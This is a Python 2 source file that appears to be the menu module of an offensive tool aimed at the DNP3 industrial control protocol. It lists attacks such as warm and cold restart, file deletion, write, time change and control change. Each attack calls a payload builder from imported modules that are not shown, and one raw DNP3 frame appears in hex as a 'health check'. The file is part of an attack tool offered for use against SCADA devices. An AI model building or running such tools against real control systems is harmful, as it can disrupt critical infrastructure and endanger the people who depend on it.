from Pre_made import *
from CustomPayload import *

''' What attack type are available '''
def attack_type():
	print "Enter a type of attack:"
	attack_type = int(raw_input())

	if attack_type == 1:
		dnp3 = custum_payload()

	if attack_type == 2:
		dnp3=dnp3_warm_start()

	if attack_type == 3:
		dnp3=dnp3_cold_start()

	if attack_type == 4:
		dnp3= dnp3_write()

	if attack_type == 5:
		dnp3= dnp3_data_attack()

	if attack_type == 6:
		dnp3= dnp3_app_attack()

	if attack_type == 7:
		dnp3= dnp3_file_delete()

	if attack_type == 8:
		 dnp3="\x05\x64\x05\xc0\x01\x00\x00\x04\xe9\x21"

	if attack_type == 9:
		dnp3 = dnp3_time_change()

	if attack_type == 10:
		dnp3 = dnp3_request_write_time_date()

	if attack_type == 11:
		dnp3 = custum_control()

	return dnp3,attack_type

def print_attack_type():
	''' Options selector '''

	print 'Choose one action to perform:'
	print '1: Custom packet'
	print '2: Warm Restart attack'
	print '3: Cold Restart attack'
	print '4: Write attack'
	print '5: Initialize data attack'
	print '6: App function termination attack'
	print '7: Delete file attack'
	print '8: Health check'
	print '9: Time Attack'
	print '10: Write_time_date'
	print '11: Control Change'
	print ' '

''''''